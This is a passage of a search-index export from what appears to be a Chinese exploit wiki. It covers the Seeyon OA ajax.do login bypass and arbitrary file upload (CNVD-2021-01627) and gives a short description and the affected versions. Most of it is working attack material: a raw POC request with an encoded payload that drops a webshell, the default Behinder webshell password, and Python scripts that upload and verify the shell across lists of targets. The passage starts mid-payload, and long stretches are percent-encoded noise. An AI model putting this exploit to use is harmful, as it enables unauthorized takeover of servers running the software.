402%C3 %8F%01% C2%AF%C3%A7k%C2%A2 %14% C2%AE6%C2 %96% C2 %8F %C2 %83% C2 %97% C3%A2%28. %22% 5B%C2 %93% 7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a %25% C2 %85% C3 %83g %27R%C2%AE%5B%C2%A2 %26% C2 %80% C3%A8 %21% 141gk%C3 %82% C3%952+%C2%96D%C2%9C%01q%5C%C3 %81% 1A%C2 %9F %2C8K %13% 06%C3%B4%3D%5D%C2%A38mx%C3 %93% C3 %8F - %7E%25% C2 %80% C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3 %89e%24% 15%C2%BB%C2%B0%C3%BC %07% C3%B0 %2F %C3 %9F lQ %0F %5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q %12% C2 %95% C3 %942% C2 %95% C2%9B%C2%B48%C3%BA%C2%B6 %19% C2%B0%C2%B6 %21% C2%9CA5%C2%99Q%C2%9D%1B %60% C3%8B%C3%822T%0C%C2%A2L%C2 %97% C3%A7%C2%AD%C3 %9E A%1C %07% 14%C2%A3%C2 %92% C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2 %96% 1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92 %00% C3%BC%C3 %86% C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2 %84G 4 %3E%16% C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C %3E %C2%B6%C3 %98% C2%B2 %28% C2%A5%C2%9Bi%C2 %89% C3 %96% C2%A4%C3%84.%C2 %81% C2%AC3%3D%C2 %8F N %26% C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3 %9E %2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB %40% C3%B0 %15% C2%8A %25% C2 %863% C3%A1 %00% C2 %97% C2%AB%C3 %84% 25%C3%80wn%2C%C2%B2 %0F %C3%BB%C2 %81% 7D%C3%98T%5B%C3 %83% C3%86V%C2%A8%C2 %9F %C2%B7 %07i%60% 21i %048% C3%BD%C3 %96% C3 %94% 00%09Wh%C2%AA%C2 %86e %C2 %94% 03%5B%C3%B3 %11% C3 %94% C2%A4%C3 %94% C2%A9%C3 %8E %C2%A3%3D%C2 %87% C2%AFN%1B%C3%A3%C3%B8%C2%8D %5E%13% C2 %88% C3%A1%1C%C3 %93% C2%BA%C2%AA%C2%81K %14% 2COW%13U%C3 %9F +%C3%B9%C2 %90% C2%85k%1A%C2 %83c %C3%AE%C3%A3%0D%2As%C3%9B %04% C3%BE%C2 %91% C3 %93% C3 %83% 3AV%C2%8D%C3 %93% C2 %85% 23 %3F %C3%81V%C3%A5%C3 %87% 1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3 %96% C3 %88% C2%A7u%C2%BE %40% C3%A5 %27% C3%AB7%7C%C3%AD%3Cr%C2 %89% C3 %8E %C3 %93% C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3 %86% C2%AF_k%23O%C3 %8F T %0E b%C2%AB %12% C3 %8E .k%C3 %93% 7C%2CRY %140% C2%AC %267h% 0Cs%C3 %97% C3 %807% C3%BA6%C3%9D%C3%AB%C3%8AB %09% C3 %959% C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2 %8F tb%C3 %93% 5E%C2 %95% C2 %97% 2B%0CL%1D %03% 7E%C2 %9F %C3%9B%C2%9C%C3 %8E%1E %C2 %89% C3%BE%C3%B6G %0E j%C2%9AN%C2%ADK%C2 %8E 1%C3%B53%C2%A11%C3 %90% C3%B8%C3%A1%C3%8A%C2%8D %14% C3 %962% C2 %84% C2 %90% C3 %86G %C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q %0E E%7D %08i mw%C3%93q%C3 %93% C2 %93% C2%80S%2A%C3 %87% C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF %7F %7C%C2 %9F r %26% C3%8D%C2%A3 %3E A %29% C3%A8O %5E %C2%B4%C3%B9%C2%B7%C3%A1%C3%8C %031% C2%A4%C2 %83% 0E%C3%AFw%3B%C3%A3%C2 %9F %2B%C3%B5%C3%BE%3B%C3 %95% C2%AD%C3 %99% C2%9Dim%5B%C2%A6w %07% C3%AC%C2%B7%C3%B7 %24% 3F%C2%9D %28% 40%C2%B3 %04% 1E%C2%BEt%C2 %8E %C2 %87% C3 %85% C3 %97% C3%A7%C2 %8F K%C3%A2%C3%A3%C2 %9E %C3%A97%0C%C2 %8E z %1F %C3 %81% C3%BFO %17% C3%A08%C3%B5%C2%A8c %3F %C2%BE%C3 %97% 7B%C2 %90% 12%C3 %90% 3B1i%C3%A6d %080e Y%C3%B6 %1E%5E %C2%BB %3F %C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE %17% 1CR%C2%AD%17W %05% 00%00\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url_1 , headers = headers , timeout = 5 , data = data , verify = False ) webshell_url = target_url + \"/seeyon/PeiQi.jspx\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , timeout = 5 , verify = False , headers = headers ) if response . status_code == 200 and \"\u7cfb\u7edf\u7ea7\u9519\u8bef\" in response . text : with open ( 'webshell.txt' , 'a' , encoding = 'utf8' ) as vu : vu . write ( \"\u76ee\u6807 {} \u88ab\u4e0a\u4f20\u6728\u9a6c: {} /seeyon/PeiQi.jspx \\n \" . format ( target_url , target_url )) print ( \" \\033 [31m[x] \u76ee\u6807 {} \u88ab\u4e0a\u4f20\u6728\u9a6c: {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url , target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u81f4\u8fdcOA ajax.do \u767b\u5f55\u7ed5\u8fc7 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CNVD-2021-01627"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/#\u81f4\u8fdcoa-ajaxdo\u767b\u5f55\u7ed5\u8fc7-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20-cnvd-2021-01627","text":"","title":"\u81f4\u8fdcOA ajax.do\u767b\u5f55\u7ed5\u8fc7 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CNVD-2021-01627"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA\u662f\u4e00\u5957\u529e\u516c\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6\u3002\u8fd1\u65e5\uff0c\u5947\u5b89\u4fe1CERT\u76d1\u6d4b\u5230\u81f4\u8fdcOA\u7684\u76f8\u5173\u6f0f\u6d1e\u4fe1\u606f\u3002\u7531\u4e8e\u81f4\u8fdcOA\u65e7\u7248\u672c\u67d0\u4e9b\u63a5\u53e3\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u4ee5\u53ca\u90e8\u5206\u51fd\u6570\u5b58\u5728\u8fc7\u6ee4\u4e0d\u8db3\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u5728\u65e0\u9700\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u4e0a\u4f20\u6076\u610f\u811a\u672c\u6587\u4ef6\uff0c\u4ece\u800c\u63a7\u5236\u670d\u52a1\u5668\u3002\u81f4\u8fdcOA\u5b98\u65b9\u5df2\u9488\u5bf9\u8be5\u6f0f\u6d1e\u63d0\u4f9b\u8865\u4e01\u3002\u9274\u4e8e\u6f0f\u6d1e\u5371\u5bb3\u8f83\u5927\uff0c\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u5e94\u7528\u8865\u4e01\u66f4\u65b0\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA V8.0 \u81f4\u8fdcOA V7.1\u3001V7.1SP1 \u81f4\u8fdcOA V7.0\u3001V7.0SP1\u3001V7.0SP2\u3001V7.0SP3 \u81f4\u8fdcOA V6.0\u3001V6.1SP1\u3001V6.1SP2 \u81f4\u8fdcOA V5.x \u81f4\u8fdcOA G6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/#\u6f0f\u6d1e\u590d\u73b0","text":"\u901a\u8fc7\u8bf7\u6c42\u5224\u65ad\u662f\u5426\u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e http://xxx.xxx.xxx.xxx/seeyon/thirdpartyController.do.css/..;/ajax.do \u67e5\u770b\u662f\u5426\u51fa\u73b0\u5982\u4e0a\u56fe\u5f02\u5e38\uff0c\u82e5\u5b58\u5728\u5219\u53ef\u80fd\u51fa\u73b0\u6f0f\u6d1e \u51fa\u73b0\u5f02\u5e38\uff1ajava.lang.NullPointerException:null \u7136\u540e\u8c03\u7528\u672a\u6388\u6743\u7684\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u4e0a\u4f20webshell\u6587\u4ef6 POC\u8bf7\u6c42\u5305\u5982\u4e0b POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction & managerName=formulaManager & requestCompress=gzip HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 loginPageURL=; login_locale=zh_CN; Content-Type: application/x-www-form-urlencoded managerMethod=validate & arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00 \u51b0\u874e3 \u9ed8\u8ba4\u9a6cpass : rebeyond webshell\u5730\u5740: http://xxx.xxx.xxx.xxx/seeyon/PeiQi.jspx \u6210\u529f\u4f1a\u8fd4\u56de { \"message\" : null , \"details\" : null , \"code\" : \"0436821967\" } \u5931\u8d25\u4f1a\u8fd4\u56de { \"message\" : \"\u88ab\u8feb\u4e0b\u7ebf\uff0c\u539f\u56e0\uff1a\u4e0e\u670d\u52a1\u5668\u5931\u53bb\u8fde\u63a5\" , \"code\" : \"-1\" , \"details\" : null } \u4e0a\u4f20\u540e\u8bf7\u6c42webshell\u5730\u5740\uff0c\u8bbf\u95ee\u8fd4\u56de\u51fa\u73b0\u5982\u4e0b\u56fe\u5219\u6210\u529f\u5199\u5165 [!NOTE] \u8bbf\u95ee\u72b6\u6001\u7801\u4e3a 200 \u6210\u529f \u8bbf\u95ee\u72b6\u6001\u7801\u4e3a 404 \u5931\u8d25 \u4f7f\u7528\u51b0\u874e\u8fde\u63a5: rebeyond","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u5355\u4e2a\u76ee\u6807 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_2 = target_url + \"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip\" print ( ' \\033 [36m[o] \u6b63\u5728\u8bf7\u6c42: {} ' . format ( vuln_url_2 )) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"managerMethod=validate&arguments= %1F %C2%8B %08% 00 %00% 00 %00% 00 %00% 0AuTK%C2 %93% C2%A2H %10% 3E%C3%AF%C3%BE%0A%C3 %82% C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB %13% 7Bh_%C2 %88% 28%2A %28% C2%AF%C2%8D%3D %40% 15Ba %15% C2%B0%C3%B2 %10% C3%AC%C2 %98% C3%BF%C2%BE %05% C3 %98% C3 %93% 3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2 %8E %C2%9DC%C2 %95x %C3%9D %3F %C2 %98% C3 %81% 17%C3%A6M%C2%A28%C2%A4%C2%96t3 %2F %C3%8D%C2%BA%C3%AF%C3%A2y%C2 %99% 5C%C2%BC4EqT %3F j%C3 %99% 05E %3E %C2%938Y%C3 %80% C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2 %92% 3E%C2%A5%C2 %9E W%C3 %85% C3%91S%C3%A7%C3%BB%C3%AFL%7B %7E %0B%C2%9D%C3 %82% C3%A9%C2%A3%C2%B8%C2%BF%C2%A3 %26% C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3 %00% C2%91we %3E Q%C3%AB%C3 %95% C3%B8%C2 %8F %C2%9D%C2%9D%C2 %87% C3%B6%C2%A8 %1F %C2%A6I%C3%99y%C3%B8 %09% C3%8B%C3%9C%5DH %03% 0F%C3%A3%C3%9A%C2 %87% C2%9D%C2 %98% C3%9C%C3 %80% 2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6 %25% C2%B5%C2%8CE%C3 %8E Re%C3 %81% 2C.%C3 %96% 5C %12% 402%C3 %8F%01% C2%AF%C3%A7k%C2%A2 %14% C2%AE6%C2 %96% C2 %8F %C2 %83% C2 %97% C3%A2%28. %22% 5B%C2 %93% 7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a %25% C2 %85% C3 %83g %27R%C2%AE%5B%C2%A2 %26% C2 %80% C3%A8 %21% 141gk%C3 %82% C3%952+%C2%96D%C2%9C%01q%5C%C3 %81% 1A%C2 %9F %2C8K %13% 06%C3%B4%3D%5D%C2%A38mx%C3 %93% C3 %8F - %7E%25% C2 %80% C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3 %89e%24% 15%C2%BB%C2%B0%C3%BC %07% C3%B0 %2F %C3 %9F lQ %0F %5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q %12% C2 %95% C3 %942% C2 %95% C2%9B%C2%B48%C3%BA%C2%B6 %19% C2%B0%C2%B6 %21% C2%9CA5%C2%99Q%C2%9D%1B %60% C3%8B%C3%822T%0C%C2%A2L%C2 %97% C3%A7%C2%AD%C3 %9E A%1C %07% 14%C2%A3%C2 %92% C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2 %96% 1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92 %00% C3%BC%C3 %86% C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2 %84G 4 %3E%16% C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C %3E %C2%B6%C3 %98% C2%B2 %28% C2%A5%C2%9Bi%C2 %89% C3 %96% C2%A4%C3%84.%C2 %81% C2%AC3%3D%C2 %8F N %26% C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3 %9E %2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB %40% C3%B0 %15% C2%8A %25% C2 %863% C3%A1 %00% C2 %97% C2%AB%C3 %84% 25%C3%80wn%2C%C2%B2 %0F %C3%BB%C2 %81% 7D%C3%98T%5B%C3 %83% C3%86V%C2%A8%C2 %9F %C2%B7 %07i%60% 21i %048% C3%BD%C3 %96% C3 %94% 00%09Wh%C2%AA%C2 %86e %C2 %94% 03%5B%C3%B3 %11% C3 %94% C2%A4%C3 %94% C2%A9%C3 %8E %C2%A3%3D%C2 %87% C2%AFN%1B%C3%A3%C3%B8%C2%8D %5E%13% C2 %88% C3%A1%1C%C3 %93% C2%BA%C2%AA%C2%81K %14% 2COW%13U%C3 %9F +%C3%B9%C2 %90% C2%85k%1A%C2 %83c %C3%AE%C3%A3%0D%2As%C3%9B %04% C3%BE%C2 %91% C3 %93% C3 %83% 3AV%C2%8D%C3 %93% C2 %85% 23 %3F %C3%81V%C3%A5%C3 %87% 1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3 %96% C3 %88% C2%A7u%C2%BE %40% C3%A5 %27% C3%AB7%7C%C3%AD%3Cr%C2 %89% C3 %8E %C3 %93% C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3 %86% C2%AF_k%23O%C3 %8F T %0E b%C2%AB %12% C3 %8E .k%C3 %93% 7C%2CRY %140% C2%AC %267h% 0Cs%C3 %97% C3 %807% C3%BA6%C3%9D%C3%AB%C3%8AB %09% C3 %959% C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2 %8F tb%C3 %93% 5E%C2 %95% C2 %97% 2B%0CL%1D %03% 7E%C2 %9F %C3%9B%C2%9C%C3 %8E%1E %C2 %89% C3%BE%C3%B6G %0E j%C2%9AN%C2%ADK%C2 %8E 1%C3%B53%C2%A11%C3 %90% C3%B8%C3%A1%C3%8A%C2%8D %14% C3 %962% C2 %84% C2 %90% C3 %86G %C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q %0E E%7D %08i mw%C3%93q%C3 %93% C2 %93% C2%80S%2A%C3 %87% C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF %7F %7C%C2 %9F r %26% C3%8D%C2%A3 %3E A %29% C3%A8O %5E %C2%B4%C3%B9%C2%B7%C3%A1%C3%8C %031% C2%A4%C2 %83% 0E%C3%AFw%3B%C3%A3%C2 %9F %2B%C3%B5%C3%BE%3B%C3 %95% C2%AD%C3 %99% C2%9Dim%5B%C2%A6w %07% C3%AC%C2%B7%C3%B7 %24% 3F%C2%9D %28% 40%C2%B3 %04% 1E%C2%BEt%C2 %8E %C2 %87% C3 %85% C3 %97% C3%A7%C2 %8F K%C3%A2%C3%A3%C2 %9E %C3%A97%0C%C2 %8E z %1F %C3 %81% C3%BFO %17% C3%A08%C3%B5%C2%A8c %3F %C2%BE%C3 %97% 7B%C2 %90% 12%C3 %90% 3B1i%C3%A6d %080e Y%C3%B6 %1E%5E %C2%BB %3F %C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE %17% 1CR%C2%AD%17W %05% 00%00\" requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url_2 , headers = headers , data = data , verify = False ) test_webshell ( target_url ) def test_webshell ( target_url ): webshell_url = target_url + \"/seeyon/PeiQi.jspx\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = webshell_url , timeout = 10 , verify = False , headers = headers ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42 : {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url )) if response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6210\u529f\u4e0a\u4f20 webshell : {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url , target_url )) print ( \" \\033 [32m[o] webshell\u5730\u5740\uff1a {} /seeyon/PeiQi.jspx \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u51b0\u874e3\u9ed8\u8ba4\u9a6c pass \uff1arebeyond \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u65e0\u6cd5\u5229\u7528\uff0c\u5199\u5165\u5931\u8d25 \\033 [0m\" 